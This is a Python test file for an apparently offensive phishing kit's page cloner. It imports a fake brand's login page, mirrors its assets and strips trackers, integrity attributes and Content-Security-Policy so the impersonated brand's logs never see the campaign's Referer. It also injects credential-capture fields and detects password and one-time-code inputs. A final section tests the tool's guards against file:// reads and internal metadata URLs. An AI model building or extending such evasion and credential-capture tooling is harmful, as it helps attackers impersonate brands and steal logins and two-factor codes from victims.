"""Asset mirroring: a clone must be self-contained.

The old importer rewrote relative asset URLs to ABSOLUTE, so the victim's browser
fetched CSS/JS/images from the real brand's CDN while looking at our page: the
target's logs then hold the victim's IP hitting its own assets with a Referer from
the campaign domain, and any blocked asset makes the clone render obviously fake.

These tests run a fake brand site and import it, then assert the template renders
with zero remote references, that beacon scripts are gone, and - the part that
matters for staying unseen - that the brand's server never saw a Referer.
"""
import json
import os
import re
import socketserver
import sys
import tempfile
import threading
import time
from http.server import BaseHTTPRequestHandler

import pytest

HERE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, HERE)

pytestmark = pytest.mark.integration

PAGE = """<!doctype html><html><head>
<meta name="viewport" content="width=device-width">
<link rel="stylesheet" href="/static/app.css" integrity="sha384-abc" crossorigin="anonymous">
<link rel="icon" href="favicon.ico">
<script src="/static/app.js"></script>
<script src="https://www.google-analytics.com/analytics.js"></script>
<script src="https://connect.facebook.net/en_US/fbevents.js"></script>
<style>.hero{background:url('/static/hero.png') no-repeat}</style>
</head><body>
<img src="logo.png" alt="logo">
<form action="/session" method="post"><input name="login"><input name="password" type="password"></form>
</body></html>"""

CSS = "@font-face{font-family:X;src:url('/static/x.woff2') format('woff2')}body{color:#123456}"


class BrandSite(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    seen = []

    def log_message(self, *a):
        pass

    def do_GET(self):
        BrandSite.seen.append({"path": self.path,
                               "referer": self.headers.get("Referer"),
                               "ua": self.headers.get("User-Agent", "")})
        if self.path.startswith("/login"):
            body = PAGE.encode()
            ctype = "text/html; charset=utf-8"
        elif self.path == "/static/app.css":
            body = CSS.encode()
            ctype = "text/css"
        elif self.path.endswith(".js"):
            body = b"console.log('app')"
            ctype = "application/javascript"
        elif self.path.endswith(".png"):
            body = b"\x89PNG\r\n\x1a\n" + b"0" * 40
            ctype = "image/png"
        elif self.path.endswith(".woff2"):
            body = b"wOF2" + b"0" * 40
            ctype = "font/woff2"
        elif self.path.endswith(".ico"):
            body = b"\x00\x00\x01\x00" + b"0" * 20
            ctype = "image/x-icon"
        else:
            body, ctype = b"not found", "text/plain"
            self.send_response(404)
            self.send_header("Content-Type", ctype)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


@pytest.fixture()
def brand(monkeypatch):
    home = tempfile.mkdtemp(prefix="bh_mirror_home_")
    monkeypatch.setenv("BYTEPHISHER_HOME", home)
    # the fixture brand runs on loopback, which the asset guard refuses unless
    # the operator opts in: that guard is what stops a hostile page steering the
    # importer at an internal endpoint
    monkeypatch.setenv("BYTEPHISHER_ALLOW_LOCAL_IMPORT", "1")
    BrandSite.seen = []
    srv = socketserver.ThreadingTCPServer(("127.0.0.1", 0), BrandSite)
    srv.daemon_threads = True
    port = srv.server_address[1]
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    time.sleep(0.2)
    # import_site resolves TEMPLATES at import time from the env var
    for mod in [m for m in list(sys.modules) if m.endswith("import_site")]:
        del sys.modules[mod]
    yield home, port
    srv.shutdown()


def _import(home, port, mirror=True):
    from tools import import_site as imp
    imp.TEMPLATES = os.path.join(home, "templates")
    os.makedirs(imp.TEMPLATES, exist_ok=True)
    return imp.import_site(url=f"http://127.0.0.1:{port}/login", name="FakeBrand",
                           slug="fakebrand", mirror=mirror)


def _html(res):
    with open(os.path.join(res["dir"], "index.html"), encoding="utf-8") as f:
        return f.read()


class TestMirroring:

    def test_the_page_has_no_remote_asset_left(self, brand):
        home, port = brand
        res = _import(home, port)
        html = _html(res)
        remote = re.findall(r'(?:src|href)=["\'](https?://[^"\']+)', html, re.I)
        assert remote == [], remote
        assert "assets/" in html

    def test_the_assets_are_on_disk(self, brand):
        home, port = brand
        res = _import(home, port)
        files = sorted(os.listdir(os.path.join(res["dir"], "assets")))
        for want in (".css", ".js", ".png", ".woff2", ".ico"):
            assert any(f.endswith(want) for f in files), (want, files)

    def test_a_css_pulls_its_own_fonts(self, brand):
        """The font must resolve from inside assets/.

        A stylesheet's url() is relative to the STYLESHEET, not to the page, so a
        rewritten `url(assets/x.woff2)` inside assets/app.css resolves to
        assets/assets/x.woff2 - a 404 and a page rendering in fallback fonts.
        """
        home, port = brand
        res = _import(home, port)
        assets = os.path.join(res["dir"], "assets")
        css = [f for f in os.listdir(assets) if f.endswith(".css")]
        assert css, os.listdir(assets)
        text = open(os.path.join(assets, css[0]), encoding="utf-8").read()
        assert "/static/x.woff2" not in text, text
        refs = re.findall(r"url\(\s*[\"\']?([^\"\')]+)", text)
        assert refs, text
        for ref in refs:
            assert not ref.startswith("assets/"), (ref, text)
            assert os.path.isfile(os.path.join(assets, ref)), (ref, os.listdir(assets))

    def test_beacons_are_removed_not_mirrored(self, brand):
        home, port = brand
        res = _import(home, port)
        html = _html(res)
        assert "google-analytics" not in html
        assert "fbevents" not in html and "connect.facebook.net" not in html
        assert len(res["mirror"]["trackers_removed"]) >= 2, res["mirror"]

    def test_sri_and_crossorigin_are_stripped_from_mirrored_tags(self, brand):
        home, port = brand
        res = _import(home, port)
        html = _html(res)
        assert "integrity=" not in html.lower()
        assert "crossorigin=" not in html.lower()

    def test_the_brand_never_sees_a_referer_or_our_host(self, brand):
        """The point of mirroring: the target's logs must not connect the clone."""
        home, port = brand
        _import(home, port)
        assert BrandSite.seen, "the importer never reached the brand"
        referers = [r["referer"] for r in BrandSite.seen if r["referer"]]
        assert referers == [], referers
        for r in BrandSite.seen:
            assert "bytephisher" not in r["ua"].lower()

    def test_the_forms_and_fields_are_still_handled(self, brand):
        home, port = brand
        res = _import(home, port)
        html = _html(res)
        assert 'action="/"' in html
        assert res["capture_fields"] == ["login", "password"], res["capture_fields"]
        fields = json.load(open(os.path.join(res["dir"], "fields.json")))
        assert fields["capture_fields"] == ["login", "password"]

    def test_no_mirror_keeps_the_old_behaviour(self, brand):
        home, port = brand
        res = _import(home, port, mirror=False)
        html = _html(res)
        assert "http://127.0.0.1:" in html        # absolute, as before
        assert not os.path.isdir(os.path.join(res["dir"], "assets"))

    def test_the_report_counts_what_it_did(self, brand):
        home, port = brand
        res = _import(home, port)
        m = res["mirror"]
        assert m["bytes"] > 0
        assert len(m["mirrored"]) >= 4, m
        assert m["remaining_remote"] == [], m


# ==================================================== the advanced clone pass ==
ADV_PAGE = """<!doctype html><html><head>
<base href="https://brand.example/">
<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
<meta name="viewport" content="width=device-width">
<link rel="stylesheet" href="/static/app.css">
<style>.hero{background:url('/static/hero.png')}</style>
</head><body>
<img src="logo.png" srcset="logo.png 1x, logo@2x.png 2x" alt="logo">
<form action="/session" method="post">
  <label for="user">Email or phone</label>
  <input id="user" name="user" type="email" placeholder="Email" autocomplete="username">
  <label for="pass">Password</label>
  <input id="pass" name="pass" type="password" autocomplete="current-password">
  <input name="totp_code" type="text" inputmode="numeric">
  <button type="submit">Sign in</button>
</form>
<script src="/static/app.js"></script>
</body></html>"""

ADV_CSS = ("@import url('/static/theme.css');\n"
           "@font-face{font-family:X;src:url('/static/x.woff2') format('woff2')}\n"
           "body{color:#0A5BD3;background:url('/static/hero.png')}")


class AdvSite(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, *a):
        pass

    def do_GET(self):
        if self.path.startswith("/login"):
            body, ctype = ADV_PAGE.encode(), "text/html; charset=utf-8"
        elif self.path == "/static/app.css":
            body, ctype = ADV_CSS.encode(), "text/css"
        elif self.path == "/static/theme.css":
            body, ctype = b".t{color:#fff}", "text/css"
        elif self.path.endswith((".js",)):
            body, ctype = b"console.log('a')", "application/javascript"
        elif self.path.endswith((".png", ".woff2")):
            body, ctype = b"\x89PNG\r\n\x1a\n" + b"0" * 20, "image/png"
        else:
            body, ctype = b"nope", "text/plain"
            self.send_response(404)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


class WallSite(AdvSite):
    def do_GET(self):
        body = (b"<html><head><title>Just a moment...</title></head>"
                b"<body>Checking your browser before accessing</body></html>")
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


@pytest.fixture()
def adv(monkeypatch):
    home = tempfile.mkdtemp(prefix="bh_adv_home_")
    monkeypatch.setenv("BYTEPHISHER_HOME", home)
    # the fixture brand runs on loopback, which the asset guard refuses unless
    # the operator opts in: that guard is what stops a hostile page steering the
    # importer at an internal endpoint
    monkeypatch.setenv("BYTEPHISHER_ALLOW_LOCAL_IMPORT", "1")
    srv = socketserver.ThreadingTCPServer(("127.0.0.1", 0), AdvSite)
    srv.daemon_threads = True
    port = srv.server_address[1]
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    time.sleep(0.2)
    for mod in [m for m in list(sys.modules) if m.endswith("import_site")]:
        del sys.modules[mod]
    yield home, port
    srv.shutdown()


@pytest.fixture()
def wall(monkeypatch):
    home = tempfile.mkdtemp(prefix="bh_wall_home_")
    monkeypatch.setenv("BYTEPHISHER_HOME", home)
    # the fixture brand runs on loopback, which the asset guard refuses unless
    # the operator opts in: that guard is what stops a hostile page steering the
    # importer at an internal endpoint
    monkeypatch.setenv("BYTEPHISHER_ALLOW_LOCAL_IMPORT", "1")
    srv = socketserver.ThreadingTCPServer(("127.0.0.1", 0), WallSite)
    srv.daemon_threads = True
    port = srv.server_address[1]
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    time.sleep(0.2)
    for mod in [m for m in list(sys.modules) if m.endswith("import_site")]:
        del sys.modules[mod]
    yield home, port
    srv.shutdown()


def _adv_import(home, port, **kw):
    from tools import import_site as imp
    imp.TEMPLATES = os.path.join(home, "templates")
    os.makedirs(imp.TEMPLATES, exist_ok=True)
    return imp.import_site(url=f"http://127.0.0.1:{port}/login", name="AdvBrand",
                           slug="advbrand", **kw)


class TestTheAdvancedClone:
    def test_the_capture_fields_are_injected_and_the_page_fields_are_kept(self, adv):
        home, port = adv
        res = _adv_import(home, port)
        html = _html(res)
        assert 'name="hp_email"' in html and 'name="_tpl"' in html
        assert 'name="_ts"' in html and "hp_email" in html
        assert res["capture_injected"] is True
        # the page's own names stay the field list; ours are added, not merged into it
        assert res["capture_fields"] == ["user", "pass", "totp_code"]

    def test_the_field_map_carries_types_placeholders_and_labels(self, adv):
        home, port = adv
        res = _adv_import(home, port)
        by_name = {f["name"]: f for f in res["form_fields"]}
        assert by_name["user"]["type"] == "email"
        assert by_name["user"]["placeholder"] == "Email"
        assert by_name["user"]["autocomplete"] == "username"
        assert by_name["user"]["label"] == "Email or phone"
        assert by_name["pass"]["type"] == "password"

    def test_the_otp_field_on_the_page_is_detected(self, adv):
        home, port = adv
        res = _adv_import(home, port)
        fields = json.load(open(os.path.join(res["dir"], "fields.json")))
        assert "totp_code" in fields["page_otp_fields"]

    def test_srcset_candidates_are_mirrored_and_local(self, adv):
        home, port = adv
        res = _adv_import(home, port)
        html = _html(res)
        assert res["mirror"]["srcset_rewritten"] >= 2, res["mirror"]
        assert "https://brand.example" not in html
        assert "/static/" not in html
        for ref in re.findall(r"srcset=[\"']([^\"']+)", html):
            for part in ref.split(","):
                target = part.strip().split(" ")[0]
                assert os.path.isfile(os.path.join(res["dir"], target)), target

    def test_a_css_import_is_followed(self, adv):
        home, port = adv
        res = _adv_import(home, port)
        assert res["mirror"]["css_imports"] >= 1, res["mirror"]
        assets = os.path.join(res["dir"], "assets")
        css = [f for f in os.listdir(assets) if f.endswith(".css")]
        joined = "".join(open(os.path.join(assets, f), encoding="utf-8").read()
                         for f in css)
        assert "/static/theme.css" not in joined, joined
        assert os.path.isfile(os.path.join(assets, "theme.css"))

    def test_a_csp_meta_and_a_base_tag_are_removed(self, adv):
        home, port = adv
        res = _adv_import(home, port)
        html = _html(res).lower()
        assert "content-security-policy" not in html
        assert "<base" not in html
        assert res["mirror"]["csp_stripped"] == 1
        assert res["mirror"]["base_dropped"] == 1

    def test_the_clone_report_is_written_next_to_the_page(self, adv):
        home, port = adv
        res = _adv_import(home, port)
        path = os.path.join(res["dir"], "clone_report.json")
        assert os.path.isfile(path)
        report = json.load(open(path))
        assert report["slug"] == "advbrand"
        assert report["capture_injected"] is True
        assert report["mirror"]["bytes"] > 0
        assert report["brand"].startswith("#")

    def test_scripts_can_be_stripped_but_the_beacon_stays(self, adv):
        home, port = adv
        res = _adv_import(home, port, strip_scripts=True)
        html = _html(res)
        assert "console.log" not in html
        assert "hp_email" in html and "addEventListener" in html
        assert res["mirror"]["scripts_removed"] >= 1

    def test_a_bot_wall_is_reported_rather_than_cloned_silently(self, wall):
        home, port = wall
        res = _adv_import(home, port)
        assert res["warning"], res
        assert "bot wall" in res["warning"]
        report = json.load(open(os.path.join(res["dir"], "clone_report.json")))
        assert report["warning"]


# ==================================================== the cloner's own guard ==
class TestTheClonerRefusesWhatItShould:
    """Every test here pins a defect proven by running the real importer first."""

    def test_a_non_http_scheme_is_never_fetched(self, tmp_path):
        """_get_bytes had no scheme allowlist while fetch() did, so an asset URL taken
        from the imported page (file:///etc/hostname) was read and written into the
        clone: the operator never supplied that URL, the page did."""
        from tools import import_site as imp
        for url in ("file:///etc/hostname", "ftp://example.com/x.bin",
                    "gopher://example.com/x"):
            with pytest.raises(ValueError):
                imp._get_bytes(url)

    def test_the_mirror_refuses_a_non_public_target(self, monkeypatch):
        from tools import import_site as imp
        monkeypatch.delenv("BYTEPHISHER_ALLOW_LOCAL_IMPORT", raising=False)
        assert imp._is_public_target("http://127.0.0.1/x") is False
        assert imp._is_public_target("http://10.0.0.5/x") is False
        assert imp._is_public_target("http://169.254.169.254/latest/meta-data/") is False
        assert imp._is_public_target("http://[::1]/x") is False
        assert imp._is_public_target("https://example.com/x") is True
        monkeypatch.setenv("BYTEPHISHER_ALLOW_LOCAL_IMPORT", "1")
        assert imp._allow_local() is True

    def test_the_asset_read_is_capped_at_the_budget(self):
        """limit_bytes was checked AFTER r.read(), so a network peer chose this
        process's peak memory (96 MiB read against a 12 MiB budget)."""
        import http.server
        import socketserver

        class Big(http.server.BaseHTTPRequestHandler):
            protocol_version = "HTTP/1.1"

            def log_message(self, *a):
                pass

            def do_GET(self):
                blob = b"x" * 200000
                self.send_response(200)
                self.send_header("Content-Length", str(len(blob)))
                self.end_headers()
                self.wfile.write(blob)

        srv = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Big)
        srv.daemon_threads = True
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        time.sleep(0.2)
        try:
            from tools import import_site as imp
            with pytest.raises(ValueError):
                imp._get_bytes(f"http://127.0.0.1:{srv.server_address[1]}/big.bin",
                               limit=1024)
        finally:
            srv.shutdown()

    def test_a_symlink_at_an_output_name_is_refused(self, tmp_path):
        """open(..., 'wb') followed a pre-planted symlink and wrote outside the dir."""
        from tools import import_site as imp
        outside = tmp_path / "victim.txt"
        outside.write_text("original", encoding="utf-8")
        link = tmp_path / "index.html"
        try:
            link.symlink_to(outside)
        except (OSError, NotImplementedError):
            pytest.skip("symlinks are not available here")
        with pytest.raises(OSError):
            imp._write_file(str(link), "hijacked", binary=False)
        assert outside.read_text(encoding="utf-8") == "original"

    def test_the_manifest_stores_a_basename(self, tmp_path, monkeypatch):
        """An absolute 'dir' kept a copied or moved checkout pointing at the original
        location (the generator deliberately stores the basename)."""
        import tools.import_site as imp
        home = tmp_path / "home"
        (home / "templates").mkdir(parents=True)
        monkeypatch.setattr(imp, "TEMPLATES", str(home / "templates"))
        monkeypatch.setenv("BYTEPHISHER_ALLOW_LOCAL_IMPORT", "1")
        res = imp.import_site(file=os.path.join("tests", "fixtures", "custom_login.html"),
                              name="BaseName", slug="basename", index=1)
        manifest = json.load(open(os.path.join(imp.TEMPLATES, "templates.json")))
        entry = next(e for e in manifest if e["index"] == 1)
        assert entry["dir"] == os.path.basename(res["dir"])
        assert not os.path.isabs(entry["dir"])

    def test_a_taken_index_is_refused_not_silently_orphaned(self, tmp_path, monkeypatch):
        import tools.import_site as imp
        home = tmp_path / "home2"
        (home / "templates").mkdir(parents=True)
        monkeypatch.setattr(imp, "TEMPLATES", str(home / "templates"))
        monkeypatch.setenv("BYTEPHISHER_ALLOW_LOCAL_IMPORT", "1")
        imp.import_site(file=os.path.join("tests", "fixtures", "custom_login.html"),
                        name="First", slug="first", index=1)
        with pytest.raises(SystemExit):
            imp.import_site(file=os.path.join("tests", "fixtures", "custom_login.html"),
                            name="Second", slug="second", index=1)
        dirs = [d for d in os.listdir(imp.TEMPLATES) if os.path.isdir(
            os.path.join(imp.TEMPLATES, d))]
        assert len(dirs) == 1, dirs


class TestTheAssetCacheIsContextIndependent:
    def test_a_page_reference_is_not_a_bare_stylesheet_filename(self, adv):
        """A URL first reached from a stylesheet was cached as a bare filename and a
        later HTML attribute reused it, where it resolves next to index.html instead of
        inside assets/ (a 404)."""
        home, port = adv
        res = _adv_import(home, port)
        html = _html(res)
        for attr in re.findall(r'(?:src|href)=["\']([^"\']+)', html):
            if attr.startswith(("http", "/", "#", "data:")):
                continue
            assert os.path.isfile(os.path.join(res["dir"], attr)), (attr, "404s")
